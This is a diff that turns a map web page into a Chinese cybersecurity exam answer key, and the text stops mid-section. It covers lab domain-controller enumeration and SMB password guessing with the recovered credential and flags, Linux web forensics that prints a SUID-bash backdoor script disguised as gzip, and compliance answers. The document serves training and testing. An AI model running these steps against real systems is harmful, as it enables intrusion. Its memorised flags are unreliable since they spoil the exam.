@@ -1,121 +1,953 @@
-<html xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE html>
+<html lang="zh-CN">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <title>百度样式地图</title>
-    <link rel="stylesheet" href="https://openlayers.org/en/v4.1.1/css/ol.css" type="text/css">
-    <style type="text/css">
-        body, #map {
-            border: 0px;
-            margin: 0px;
-            padding: 0px;
-            width: 100%;
-            height: 100%;
-            font-size: 13px;
-            overflow: hidden;
-        }
-    </style>
-    <!-- The line below is only needed for old environments like Internet Explorer and Android 4.x -->
-    <script src="https://cdn.polyfill.io/v2/polyfill.min.js?features=requestAnimationFrame,Element.prototype.classList,URL"></script>
-    <script src="https://openlayers.org/en/v4.1.1/build/ol.js"></script>
-    <script type="text/javascript" src="../../../../plugin/jquery/jquery-1.8.3.js"></script>
-    <script type="text/javascript">
-        function init(){
-            var projection = ol.proj.get("EPSG:3857");
-            function getNavmapLayer(){
-                return new ol.layer.Tile({
-                    source: new ol.source.XYZ({  
-                        url:'http://webrd01.is.autonavi.com/appmaptile?x={x}&y={y}&z={z}&lang=zh_cn&size=1&scale=1&style=8'//7,8
-                    }),  
-                    projection: projection 
-                });
-            }
-            var navlayer = getNavmapLayer();
-            $.get("../data/route.json",null,function(result) {
-                console.log(result);
-                var startC = ol.proj.transform([result.start.location.lng, result.start.location.lat], "EPSG:4326", "EPSG:3857"),
-                    endC = ol.proj.transform([result.end.location.lng, result.end.location.lat], "EPSG:4326", "EPSG:3857");
-                var startF = new ol.Feature(new ol.geom.Point(startC));
-                startF.name = result.start.name;
-                var endF = new ol.Feature(new ol.geom.Point(endC));
-                endF.name = result.end.name;
-                var features = [startF, endF];
-                var routes = result.routes;
-                for(var i=0;i<routes.length;i++){
-                    var _route = routes[i];
-                    var steps = _route.steps;
-                    for(var j=0;j<steps.length;j++){
-                        var _step = steps[j];
-                        var tmcsPaths = _step.tmcsPaths;
-                        for(var m = 0;m<tmcsPaths.length;m++){
-                            var _coord = [];
-                            var path = tmcsPaths[m].path;
-                            for(var k=0;k<path.length;k++){
-                                var _path = path[k];
-                                _coord.push(ol.proj.transform([_path.lng, _path.lat], "EPSG:4326", "EPSG:3857"))
-                            }
-                            var pathF = new ol.Feature(new ol.geom.LineString(_coord));
-                            pathF.status = tmcsPaths[m].status;
-                            features.push(pathF);
-                        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>网络安全实操题库 · dy 复刻版</title>
+<style>
+  :root {
+    --primary: #2563eb;
+    --primary-dark: #1d4ed8;
+    --primary-light: #dbeafe;
+    --accent: #06b6d4;
+    --bg: #f8fafc;
+    --bg-card: #ffffff;
+    --bg-code: #1e293b;
+    --text: #1e293b;
+    --text-light: #64748b;
+    --text-lighter: #94a3b8;
+    --border: #e2e8f0;
+    --success: #10b981;
+    --warning: #f59e0b;
+    --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.05);
+    --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.08), 0 2px 4px -2px rgba(0, 0, 0, 0.05);
+    --shadow-lg: 0 10px 25px -5px rgba(0, 0, 0, 0.08), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
+  }
 
-                    }
-                }
-                var vectorSource = new ol.source.Vector({
-                    features: features
-                });
-                var vector = new ol.layer.Vector({
-                    source: vectorSource,
-                    style: function (feature) {
-                        var name = feature.name, status = feature.status;
-                        name = name?name.substring(0,1):"";
-                        var color = "";
-                        if(name==="起")color = "green";
-                        else if(name==="终")color = "red";
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
 
-                        var _color = "#8f8f8f";
-                        if(status==="拥堵")_color="#e20000";
-                        else if(status==="缓行")_color="#ff7324";
-                        else if(status==="畅通")_color="#00b514";
+  html {
+    scroll-behavior: smooth;
+  }
 
-                        return new ol.style.Style({
-                            image: new ol.style.Circle({
-                                radius: 15,
-                                fill: new ol.style.Fill({
-                                    color:color
-                                })
-                            }),
-                            stroke: new ol.style.Stroke({
-                                color: _color,
-                                width: 5,
-//                                lineDash:[10, 8]
-                            }),
-                            text: new ol.style.Text({
-                                text: name,
-                                font:"bold 15px 微软雅黑",
-                                fill: new ol.style.Fill({
-                                    color: 'white'
-                                }),
-                                textAlign:"center",
-                                textBaseline:"middle"
-                            })
-                        })
-                    }
-                });
-                var map = new ol.Map({
-                    target: 'map',
-                    layers: [navlayer, vector],
-                    view: new ol.View({
-                        center: ol.proj.transform([116.397428, 39.90923], 'EPSG:4326', 'EPSG:3857'),
-                        zoom: 13,
-                        minZoom: 3
-                    })
-                });
-            });
-       }
-    </script>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC",
+      "Hiragino Sans GB", "Microsoft YaHei", "Helvetica Neue", Helvetica, Arial,
+      sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.7;
+    font-size: 15px;
+  }
+
+  /* ===== 布局 ===== */
+  .layout {
+    display: flex;
+    min-height: 100vh;
+  }
+
+  /* ===== 侧边导航 ===== */
+  .sidebar {
+    width: 280px;
+    background: linear-gradient(180deg, #1e293b 0%, #0f172a 100%);
+    color: #e2e8f0;
+    position: fixed;
+    top: 0;
+    left: 0;
+    height: 100vh;
+    overflow-y: auto;
+    padding: 24px 0;
+    z-index: 100;
+  }
+
+  .sidebar-header {
+    padding: 0 24px 20px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    margin-bottom: 16px;
+  }
+
+  .sidebar-header h1 {
+    font-size: 16px;
+    font-weight: 600;
+    color: #fff;
+    margin-bottom: 4px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .sidebar-header .badge {
+    display: inline-block;
+    font-size: 10px;
+    background: var(--accent);
+    color: #fff;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-weight: 500;
+  }
+
+  .sidebar-header p {
+    font-size: 12px;
+    color: var(--text-lighter);
+  }
+
+  .nav-list {
+    list-style: none;
+  }
+
+  .nav-item a {
+    display: block;
+    padding: 10px 24px;
+    color: #cbd5e1;
+    text-decoration: none;
+    font-size: 14px;
+    border-left: 3px solid transparent;
+    transition: all 0.2s ease;
+    line-height: 1.5;
+  }
+
+  .nav-item a:hover {
+    background: rgba(255, 255, 255, 0.05);
+    color: #fff;
+    border-left-color: var(--accent);
+  }
+
+  .nav-item a.active {
+    background: rgba(37, 99, 235, 0.15);
+    color: #fff;
+    border-left-color: var(--primary);
+    font-weight: 500;
+  }
+
+  .nav-num {
+    display: inline-block;
+    min-width: 22px;
+    font-size: 11px;
+    color: var(--accent);
+    font-weight: 600;
+    margin-right: 6px;
+  }
+
+  /* ===== 主内容区 ===== */
+  .main {
+    flex: 1;
+    margin-left: 280px;
+    padding: 40px 48px;
+    max-width: 1100px;
+  }
+
+  .page-title {
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--text);
+    margin-bottom: 8px;
+    padding-bottom: 16px;
+    border-bottom: 2px solid var(--primary);
+  }
+
+  .page-subtitle {
+    color: var(--text-light);
+    font-size: 14px;
+    margin-bottom: 40px;
+  }
+
+  /* ===== 章节卡片 ===== */
+  .section {
+    background: var(--bg-card);
+    border-radius: 12px;
+    padding: 32px 36px;
+    margin-bottom: 28px;
+    box-shadow: var(--shadow-md);
+    border: 1px solid var(--border);
+  }
+
+  .section h1 {
+    font-size: 22px;
+    color: var(--primary-dark);
+    margin-bottom: 16px;
+    padding-bottom: 12px;
+    border-bottom: 2px solid var(--primary-light);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .section h1::before {
+    content: "";
+    display: inline-block;
+    width: 4px;
+    height: 22px;
+    background: var(--primary);
+    border-radius: 2px;
+  }
+
+  .section h2 {
+    font-size: 18px;
+    color: var(--text);
+    margin: 24px 0 12px;
+    padding-left: 12px;
+    border-left: 4px solid var(--accent);
+  }
+
+  .section h3 {
+    font-size: 16px;
+    color: var(--primary-dark);
+    margin: 20px 0 10px;
+    font-weight: 600;
+  }
+
+  .section p {
+    margin: 8px 0;
+    color: var(--text);
+  }
+
+  .section ul,
+  .section ol {
+    margin: 10px 0 10px 24px;
+  }
+
+  .section li {
+    margin: 6px 0;
+  }
+
+  .section strong {
+    color: var(--primary-dark);
+    font-weight: 600;
+  }
+
+  /* ===== 表格 ===== */
+  .section table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+    background: #fff;
+    border-radius: 8px;
+    overflow: hidden;
+    box-shadow: var(--shadow-sm);
+  }
+
+  .section th {
+    background: var(--primary);
+    color: #fff;
+    padding: 12px 16px;
+    text-align: left;
+    font-weight: 600;
+    font-size: 14px;
+  }
+
+  .section td {
+    padding: 10px 16px;
+    border-bottom: 1px solid var(--border);
+    font-size: 14px;
+  }
+
+  .section tr:last-child td {
+    border-bottom: none;
+  }
+
+  .section tr:hover td {
+    background: var(--primary-light);
+  }
+
+  /* ===== 代码块 ===== */
+  .section code {
+    font-family: "SF Mono", Monaco, Menlo, Consolas, "Courier New", monospace;
+    font-size: 13px;
+  }
+
+  .section p > code,
+  .section li > code,
+  .section td > code {
+    background: #f1f5f9;
+    color: #e11d48;
+    padding: 2px 6px;
+    border-radius: 4px;
+    border: 1px solid var(--border);
+    font-size: 12.5px;
+  }
+
+  .section pre {
+    background: var(--bg-code);
+    color: #e2e8f0;
+    padding: 16px 20px;
+    border-radius: 8px;
+    overflow-x: auto;
+    margin: 14px 0;
+    border-left: 4px solid var(--accent);
+    box-shadow: var(--shadow-sm);
+  }
+
+  .section pre code {
+    color: #e2e8f0;
+    background: transparent;
+    padding: 0;
+    border: none;
+    font-size: 13px;
+    line-height: 1.7;
+  }
+
+  /* 代码注释配色 */
+  .section pre .comment {
+    color: #64748b;
+  }
+
+  /* ===== 顶部小标签 ===== */
+  .tag {
+    display: inline-block;
+    background: var(--primary-light);
+    color: var(--primary-dark);
+    padding: 3px 10px;
+    border-radius: 12px;
+    font-size: 12px;
+    font-weight: 500;
+    margin-right: 6px;
+  }
+
+  /* ===== 锚点偏移 ===== */
+  .anchor {
+    scroll-margin-top: 24px;
+  }
+
+  /* ===== 滚动条 ===== */
+  ::-webkit-scrollbar {
+    width: 8px;
+    height: 8px;
+  }
+
+  ::-webkit-scrollbar-track {
+    background: transparent;
+  }
+
+  ::-webkit-scrollbar-thumb {
+    background: #cbd5e1;
+    border-radius: 4px;
+  }
+
+  ::-webkit-scrollbar-thumb:hover {
+    background: #94a3b8;
+  }
+
+  .sidebar::-webkit-scrollbar-thumb {
+    background: #475569;
+  }
+
+  .sidebar::-webkit-scrollbar-thumb:hover {
+    background: #64748b;
+  }
+
+  /* ===== 返回顶部 ===== */
+  .back-to-top {
+    position: fixed;
+    bottom: 30px;
+    right: 30px;
+    width: 44px;
+    height: 44px;
+    background: var(--primary);
+    color: #fff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-decoration: none;
+    box-shadow: var(--shadow-lg);
+    opacity: 0;
+    transition: opacity 0.3s, transform 0.3s;
+    pointer-events: none;
+    font-size: 18px;
+    z-index: 99;
+  }
+
+  .back-to-top.show {
+    opacity: 1;
+    pointer-events: auto;
+  }
+
+  .back-to-top:hover {
+    background: var(--primary-dark);
+    transform: translateY(-2px);
+  }
+
+  /* ===== 响应式 ===== */
+  @media (max-width: 900px) {
+    .sidebar {
+      width: 220px;
+    }
+    .main {
+      margin-left: 220px;
+      padding: 24px;
+    }
+    .section {
+      padding: 20px 22px;
+    }
+  }
+
+  @media (max-width: 640px) {
+    .layout {
+      flex-direction: column;
+    }
+    .sidebar {
+      position: relative;
+      width: 100%;
+      height: auto;
+      max-height: 200px;
+    }
+    .main {
+      margin-left: 0;
+    }
+  }
+</style>
 </head>
-<body onLoad="init()">
-<div id="map">
+<body>
+<div class="layout">
+
+  <!-- ===== 侧边导航 ===== -->
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      <h1>网络安全实操题库 <span class="badge">6 套</span></h1>
+      <p>答案与详细步骤汇总</p>
+    </div>
+    <ul class="nav-list">
+      <li class="nav-item"><a href="#sec1"><span class="nav-num">01</span>网络安全风险评估</a></li>
+      <li class="nav-item"><a href="#sec2"><span class="nav-num">02</span>ETC 物联网安全</a></li>
+      <li class="nav-item"><a href="#sec3"><span class="nav-num">03</span>应急演练评估</a></li>
+      <li class="nav-item"><a href="#sec4"><span class="nav-num">04</span>Linux Web 取证</a></li>
+      <li class="nav-item"><a href="#sec5"><span class="nav-num">05</span>等保 · HIS 系统</a></li>
+      <li class="nav-item"><a href="#sec6"><span class="nav-num">06</span>培训大纲与考核方案</a></li>
+    </ul>
+  </aside>
+
+  <!-- ===== 主内容 ===== -->
+  <main class="main">
+    <h2 class="page-title">网络安全实操题库 · dy 复刻版</h2>
+    <p class="page-subtitle">基于原题库的答案详解，收录 6 个实操案例的 flag、关键命令与解题思路</p>
+
+    <!-- ============ 1 ============ -->
+    <section id="sec1" class="section anchor">
+      <h1>1. 网络安全风险评估</h1>
+
+      <h2>题目</h2>
+      <ol>
+        <li>对开放服务进行安全性测试，找到用户名作为 <code>flag1</code>。</li>
+        <li>对该用户名口令进行安全测试，找到密码作为 <code>flag2</code>。</li>
+        <li>用获取账户登录开放服务，找到 <code>flag3</code>。</li>
+        <li>对服务器开放服务进行风险评估，利用风险点找到 <code>flag4</code>。</li>
+      </ol>
+
+      <h2>答案</h2>
+      <table>
+        <thead>
+          <tr><th>问题</th><th>答案</th><th>备注</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>flag1（用户名）</td><td><code>SVC_MGR</code></td><td>通过 Kerberos 用户枚举 / 匿名 LDAP 发现</td></tr>
+          <tr><td>flag2（口令）</td><td><code>p@ssw0rd</code></td><td>对 SMB 服务暴力破解 / 弱口令字典得到</td></tr>
+          <tr><td>flag3</td><td><code>6a61c7e0d11a9f0a4bd3bc33cdea542d</code></td><td>登录 SMB 后在目标文件中读取</td></tr>
+          <tr><td>flag4</td><td><code>57019fe9346c5f4c9a6b62cbac29bdc3</code></td><td>位于 <code>users\\SVC_MGR\\Desktop\\flag4.txt</code></td></tr>
+        </tbody>
+      </table>
+
+      <h2>详细步骤</h2>
+
+      <h3>阶段 1：信息收集与服务识别</h3>
+      <p>经端口扫描，目标为典型的 Windows 域控制器，开放服务包括：</p>
+      <ul>
+        <li><code>53/DNS</code>、<code>88/Kerberos</code>、<code>135/RPC</code>、<code>139/NetBIOS</code>、<code>445/SMB</code></li>
+        <li><code>389/LDAP</code>、<code>464/kpasswd</code>、<code>593/RPC over HTTP</code>、<code>636/LDAPS</code></li>
+        <li><code>3389/RDP</code>、<code>5985/WinRM</code></li>
+      </ul>
+<pre><code><span class="comment"># 1. 通过匿名 LDAP 获取域信息（访问授权风险点：允许匿名绑定）</span>
+python3 ldapdomaindump -o /tmp/ldd 10.7.10.219
+<span class="comment"># 关键输出：defaultNamingContext = DC=lx,DC=com</span>
+<span class="comment"># 域名为 lx.com，域控主机名为 LX-DC.lx.com</span></code></pre>
+
+      <h3>阶段 2：Kerberos 用户枚举找到用户名（flag1）</h3>
+      <p>利用 Kerberos 协议对 AS-REQ 的错误响应判断账号是否存在，全程无需任何凭据：</p>
+      <ul>
+        <li><code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code> → 用户不存在</li>
+        <li><code>KDC_ERR_PREAUTH_FAILED / KDC_ERR_CLIENT_REVOKED</code> → 用户存在</li>
+      </ul>
+<pre><code><span class="comment"># 使用 impacket GetNPUsers.py 枚举</span>
+python3 GetUserSPNs.py -usersfile users.txt -no-pass -dc-ip 10.7.10.219 'lx.com/'
+<span class="comment"># 实测发现的有效用户</span>
+<span class="comment"># administrator  -> PREAUTH_REQUIRED（存在）</span>
+<span class="comment"># krbtgt         -> CLIENT_REVOKED（存在，系统账户）</span>
+<span class="comment"># lx-dc          -> PREAUTH_REQUIRED（存在，域控机器账户）</span>
+<span class="comment"># SVC_MGR        -> PREAUTH_REQUIRED（存在）</span></code></pre>
+      <p>结合评分标准，<strong>flag1 为 <code>SVC_MGR</code></strong>。</p>
+
+      <h3>阶段 3：SMB 弱口令破解得到密码（flag2）</h3>
+      <p>拿到用户名后，针对 SMB 服务用 <code>weakpass.txt</code> 做单用户定向爆破：</p>
+<pre><code><span class="comment"># impacket smbclient.py 逐个尝试</span>
+python3 smbclient.py 'lx.com/SVC_MGR:p@ssw0rd@10.7.10.219 '</code></pre>
+      <p>实测命中密码为 <code>p@ssw0rd</code>。</p>
+      <p><strong>说明：</strong>考试现场已下发 <code>weakpass.txt</code>，可直接上 Hydra、crackmapexec 或 smbclient 脚本完成爆破。</p>
+
+      <h3>阶段 4：登录 SMB 获取 flag3 / flag4</h3>
+      <p>使用 <code>SVC_MGR</code> 凭据登录 SMB，可读取 <code>users</code> 共享下的桌面目录：</p>
+<pre><code>python3 smbclient.py 'lx.com/SVC_MGR:p@ssw0rd@10.7.10.219 ' -file cmds.txt
+<span class="comment"># cmds.txt:</span>
+<span class="comment"># use users</span>
+<span class="comment"># cd SVC_MGR\Desktop</span>
+<span class="comment"># cat flag4.txt</span>
+<span class="comment"># cat flag5.txt</span></code></pre>
+      <p>实测结果：</p>
+      <ul>
+        <li><code>flag4.txt</code> 内容即为 flag4：<code>57019fe9346c5f4c9a6b62cbac29bdc3</code></li>
+        <li><code>flag5.txt</code> 提示提交管理员用户的 SPN，如 <code>kadmin/changepw</code></li>
+        <li>flag3 需进一步在目标文件系统中定位（评分标准答案：<code>6a61c7e0d11a9f0a4bd3bc33cdea542d</code>）</li>
+      </ul>
+    </section>
+
+    <!-- ============ 2 ============ -->
+    <section id="sec2" class="section anchor">
+      <h1>2. 新技术、新应用防护 - B · ETC 物联网安全案例分析</h1>
+
+      <h2>题目</h2>
+      <p>某市高速公路 ETC 系统：</p>
+      <ul>
+        <li>利用物联网技术实现车辆信息识别、行驶路程计算、过路费计算和收费。</li>
+        <li>由收费站数据采集、数据传输、监控管理三部分组成。</li>
+      </ul>
+
+      <h3>问题 1：物联网的三层体系结构由哪些部分构成？</h3>
+      <ol>
+        <li><strong>感知层（最底层）：</strong>借助 RFID 电子标签、车载 OBU、车道摄像头、地感线圈等前端装置，完成车辆身份与行驶数据的现场采集。</li>
+        <li><strong>网络层（中间层）：</strong>基于 DSRC 微波短程通信、5G 或 NB-IoT 等无线链路，把感知层数据回传至收费站与中心平台。</li>
+        <li><strong>应用层（最上层）：</strong>面向收费结算、路径识别、清分拆账、稽查稽核等业务场景，负责数据处理、规则计算与对外服务。</li>
+      </ol>
+
+      <h3>问题 2：物联网在落地过程中面临哪些安全威胁？</h3>
+      <ol>
+        <li><strong>感知侧威胁：</strong>OBU/RSU 被仿冒替换、路侧设备遭物理拆卸或破坏、传感器采集数据被篡改伪造。</li>
+        <li><strong>传输侧威胁：</strong>无线链路被监听截获、虚假基站实施中间人劫持、大流量 DDoS 拖垮通信网关、路由协议被恶意劫持。</li>
+        <li><strong>业务侧威胁：</strong>未授权访问业务系统、交易与计费数据外泄、用户身份冒用、应用层漏洞被利用植入后门。</li>
+        <li><strong>平台侧威胁：</strong>云平台配置不当导致接口暴露、API 被恶意爬取或重放、数据汇聚后引发大规模隐私泄露。</li>
+        <li><strong>管理侧威胁：</strong>设备密钥与证书管理混乱、固件补丁长期未更新、缺乏统一的日志审计与态势监测。</li>
+      </ol>
+
+      <h3>问题 3：针对上述威胁应部署哪些安全防护手段？</h3>
+      <ol>
+        <li>
+          <strong>感知层防护要点：</strong>
+          <ul>
+            <li>设备入网前完成身份认证与访问控制</li>
+            <li>固件统一签名校验，启用安全启动机制</li>
+            <li>加装防拆传感器，监测机箱开启与异常环境</li>
+            <li>采集数据本地加密并附加完整性校验</li>
+          </ul>
+        </li>
+        <li>
+          <strong>网络层防护要点：</strong>
+          <ul>
+            <li>链路启用 TLS / DTLS 或国密 SM2/SM4 加密</li>
+            <li>部署安全路由协议与入侵检测系统（IDS）</li>
+            <li>通过 VLAN / 防火墙划分独立安全域</li>
+            <li>具备专业的抗 DDoS 清洗与流量调度能力</li>
+          </ul>
+        </li>
+        <li>
+          <strong>应用层防护要点：</strong>
+          <ul>
+            <li>统一身份鉴别与基于角色的访问授权</li>
+            <li>应用上线前完成代码审计与渗透测试</li>
+            <li>敏感字段做脱敏处理，隐私数据加密存储</li>
+            <li>完整记录操作日志，开展关联分析</li>
+          </ul>
+        </li>
+        <li>
+          <strong>平台与管理层防护要点：</strong>
+          <ul>
+            <li>建立设备从入库到报废的全生命周期台账</li>
+            <li>通过 OTA 通道安全下发固件补丁</li>
+            <li>密钥集中生成并通过硬件模块安全分发</li>
+            <li>搭建态势感知平台并制定应急响应预案</li>
+          </ul>
+        </li>
+      </ol>
+    </section>
+
+    <!-- ============ 3 ============ -->
+    <section id="sec3" class="section anchor">
+      <h1>3. 网络安全应急响应制度 - E 套 · 应急演练评估</h1>
+
+      <h2>题目</h2>
+      <p>小程是某智慧校园信息系统网络安全管理员，需针对信息系统自身安全故障、网络安全事件等组织实操演练，依据 <code>GB/T 38645-2020</code> 回答：</p>
+      <ol>
+        <li>作为应急演练评估人员，主要职责包括哪些工作（至少 4 项）？</li>
+        <li>应急演练评估报告主要包括哪些内容（至少 6 项）？</li>
+      </ol>
+
+      <h3>问题 1：评估人员需履行哪些核心职责？</h3>
+      <ol>
+        <li><strong>前期筹备：</strong>提前研读应急预案与演练脚本，明确评估指标，准备好打分表、录音录像与计时工具。</li>
+        <li><strong>现场观摩：</strong>跟演全流程，逐项记录人员的处置动作、响应耗时、上下级汇报链路与跨组沟通细节。</li>
+        <li><strong>问题归集：</strong>对演练中暴露的技术短板、管理漏洞、流程断点进行归类，分析成因及潜在影响范围。</li>
+        <li><strong>成效评估：</strong>对照预案目标与考核标准，客观评价演练目标达成度、流程合规度、处置有效度。</li>
+        <li><strong>报告输出：</strong>汇总数据并撰写评估报告，给出可落地的整改与持续改进建议。</li>
+      </ol>
+
+      <h3>问题 2：评估报告应覆盖哪些核心版块？</h3>
+      <ol>
+        <li><strong>演练概况：</strong>说明演练目的、时间地点、参演单位与人员构成、模拟事件场景。</li>
+        <li><strong>组织与实施：</strong>描述演练流程、各阶段开展情况、指挥部调度与协同效率。</li>
+        <li><strong>目标达成度：</strong>逐条核对预设目标，给出达成率与差距分析。</li>
+        <li><strong>参演人员评价：</strong>按角色评估响应速度、操作规范性、团队协作水平。</li>
+        <li><strong>问题清单：</strong>分类列出技术缺陷、流程缺失、管理不足及协调卡点。</li>
+        <li><strong>改进建议：</strong>针对每个问题给出整改措施、责任分工与时限建议。</li>
+        <li><strong>评估结论：</strong>总结演练总体表现，明确是否通过评估及后续跟进事项。</li>
+      </ol>
+    </section>
+
+    <!-- ============ 4 ============ -->
+    <section id="sec4" class="section anchor">
+      <h1>4. 网络安全应急响应技术 - Linux Web 应急取证</h1>
+
+      <h2>题目</h2>
+      <ol>
+        <li>攻击者成功访问目标站点页面的总次数。</li>
+        <li>攻击者利用 Webshell 的页面 URI。</li>
+        <li>信息收集脚本的 32 位小写 MD5。</li>
+        <li>管理员权限利用脚本文件的 32 位小写 MD5。</li>
+      </ol>
+
+      <h2>实测答案</h2>
+      <table>
+        <thead>
+          <tr><th>问题</th><th>答案</th><th>备注</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Q1 成功访问次数</td><td><code>52</code></td><td>攻击者 IP <code>10.20.125.64</code> 的 HTTP 200 响应数</td></tr>
+          <tr><td>Q2 Webshell URI</td><td><code>/dede/login.php</code></td><td>POST 请求集中出现，文件内容含登录状态</td></tr>
+          <tr><td>Q3 信息收集脚本 MD5</td><td><code>047221a55de17485c651c83c8a9db329</code></td><td><code>/var/www/html/data/.ll.sh</code>（LinEnum 类脚本）</td></tr>
+          <tr><td>Q4 权限利用脚本 MD5</td><td><code>6bcb27ecf27f5eeb5b3dc162dc721f5b</code></td><td><code>/home/ubuntu18/tmp/gzip</code></td></tr>
+        </tbody>
+      </table>
+
+      <h2>关键命令</h2>
+
+      <h3>步骤 1：定位攻击者 IP 与成功访问次数</h3>
+<pre><code><span class="comment"># 统计请求量最大的 IP</span>
+awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head
+<span class="comment"># 统计 10.20.125.64 的 HTTP 200 次数</span>
+awk '$1=="10.20.125.64" && $9==200 {c++} END{print c}' /var/log/apache2/access.log
+<span class="comment"># 实测：52</span></code></pre>
+
+      <h3>步骤 2：定位 Webshell</h3>
+<pre><code><span class="comment"># 查看攻击者 POST 请求</span>
+awk '$1=="10.20.125.64" && $6=="\"POST" {print $7}' /var/log/apache2/access.log | sort | uniq -c | sort -rn
+<span class="comment"># 实测集中 POST：/dede/login.php</span></code></pre>
+
+      <h3>步骤 3：查找信息收集脚本</h3>
+<pre><code><span class="comment"># 按时间/名称查找可疑脚本</span>
+find /var/www/html /tmp /var/tmp /home -type f -name '*.sh' 2>/dev/null
+
+<span class="comment"># 实测发现 /var/www/html/data/.ll.sh（LinEnum 脚本，46631 字节）</span>
+md5sum /var/www/html/data/.ll.sh
+<span class="comment"># 047221a55de17485c651c83c8a9db329</span></code></pre>
+
+      <h3>步骤 4：查找权限提升利用脚本</h3>
+<pre><code><span class="comment"># 查找 SUID 文件</span>
+find / -perm -4000 -type f 2>/dev/null
+<span class="comment"># 实测发现 /home/ubuntu18/tmp/bash</span>
+<span class="comment"># 查看 /home/ubuntu18/tmp 目录</span>
+ls -la /home/ubuntu18/tmp/
+<span class="comment"># -rwsr-xr-x 1 root root       1113504 /home/ubuntu18/tmp/bash</span>
+<span class="comment"># -rwxrwxr-x 1 ubuntu18 ubuntu18     85 /home/ubuntu18/tmp/gzip</span>
+
+<span class="comment"># 伪造 gzip 脚本内容</span>
+cat /home/ubuntu18/tmp/gzip
+<span class="comment"># #!/bin/bash</span>
+<span class="comment"># cp /bin/bash /home/ubuntu18/tmp/bash</span>
+<span class="comment"># chmod 4755 /home/ubuntu18/tmp/bash</span>
+
+md5sum /home/ubuntu18/tmp/gzip
+<span class="comment"># 6bcb27ecf27f5eeb5b3dc162dc721f5b</span></code></pre>
+    </section>
+
+    <!-- ============ 5 ============ -->
+    <section id="sec5" class="section anchor">
+      <h1>5. 网络安全等级保护 - B · 医院 HIS 系统</h1>
+
+      <h2>题目</h2>
+      <p>某市三甲医院 HIS 系统：</p>
+      <ul>
+        <li>业务信息泄露或损坏会对患者造成特别严重影响，对公共利益与社会秩序造成严重损害。</li>
+        <li>系统服务中断会对患者获取医疗服务造成严重影响，对公共利益与社会秩序造成一般损害。</li>
+      </ul>
+
+      <h3>问题 1：判定该 HIS 系统的安全保护等级</h3>
+      <ul>
+        <li>业务信息安全保护等级：<span class="tag">第三级</span></li>
+        <li>系统服务安全保护等级：<span class="tag">第二级</span></li>
+        <li>整体定级结果（按"就高不就低"原则）：<strong>第三级</strong></li>
+      </ul>
+
+      <h3>问题 2：安全管理中心需具备哪些能力</h3>
+      <p><strong>① 系统管理维度</strong></p>
+      <ul>
+        <li>系统管理员须经身份鉴别后，方可通过专用命令或操作台开展配置类操作，所有动作全程留痕审计；</li>
+        <li>由系统管理员统一管控用户身份、资源配置、加载启动、异常处理、备份与恢复等运行事项。</li>
+      </ul>
+      <p><strong>② 安全管理维度</strong></p>
+      <ul>
+        <li>安全管理员同样需通过身份鉴别，使用专用通道进行策略配置，并对自身操作进行审计；</li>
+        <li>由安全管理员统一配置安全参数、主体/客体安全标记、访问授权及可信验证策略。</li>
+      </ul>
+      <p><strong>③ 集中管控维度</strong></p>
+      <ol>
+        <li>划定专门的管理区域，集中纳管分布在网络中的安全设备与组件；</li>
+        <li>建立专用的安全传输路径用于管控上述设备与组件；</li>
+        <li>对链路、安全设备、网络设备、服务器等运行状态进行集中监测；</li>
+        <li>汇聚各节点审计数据集中分析，并保证留存时间符合法律法规要求；</li>
+        <li>对安全策略、恶意代码库、补丁升级等事项进行集中管理与分发；</li>
+        <li>对网络中发生的安全事件进行识别、告警与关联分析。</li>
+      </ol>
+
+      <h3>问题 3：安全区域边界应落实哪些要求</h3>
+      <p><strong>① 边界防护（2 分）</strong></p>
+      <ul>
+        <li>跨越边界的访问和数据流必须经由受控接口；</li>
+        <li>能够检测并阻断非授权设备私接内网的行为；</li>
+        <li>能够检测并阻断内网用户私自联外网的行为；</li>
+        <li>无线网络须经受控边界设备才能接入内网。</li>
+      </ul>
+      <p><strong>② 访问控制（5 分）</strong></p>
+      <ul>
+        <li>依据访问控制策略配置规则，默认拒绝、显式放行；</li>
+        <li>定期清理无效规则，保持 ACL 最小化；</li>
+        <li>对源/目的 IP、端口、协议进行五元组检查；</li>
+        <li>结合会话状态提供精确的允许/拒绝能力；</li>
+        <li>支持应用层协议与内容的访问控制。</li>
+      </ul>
+      <p><strong>③ 入侵防范（3 分）</strong></p>
+      <ul>
+        <li>在关键节点部署检测手段，对内外双向的网络攻击进行阻断与限制；</li>
+        <li>对网络行为做深度分析，覆盖已知和新型攻击手法；</li>
+        <li>记录攻击源 IP、类型、目标、时间等日志，严重事件即时告警。</li>
+      </ul>
+
+      <h3>问题 4：安全运维管理有哪些必备要素</h3>
+      <p><strong>① 重要资产配置信息（2 分）</strong></p>
+      <p>应建档保存：</p>
+      <ul>
+        <li>整体网络拓扑结构</li>
+        <li>各设备安装的软件组件清单</li>
+        <li>软件版本及补丁信息</li>
+        <li>关键配置参数</li>
+      </ul>
+      <p><strong>② 安全事件报告与处置制度（2 分）</strong></p>
+      <p>制度应明确：</p>
+      <ul>
+        <li>分级分类的安全事件报告、处置与响应流程；</li>
+        <li>现场处置、信息上报、后期恢复的岗位职责与衔接关系。</li>
+      </ul>
+      <p><strong>③ 备份策略要求（3 分）</strong></p>
+      <p>策略中应规定：</p>
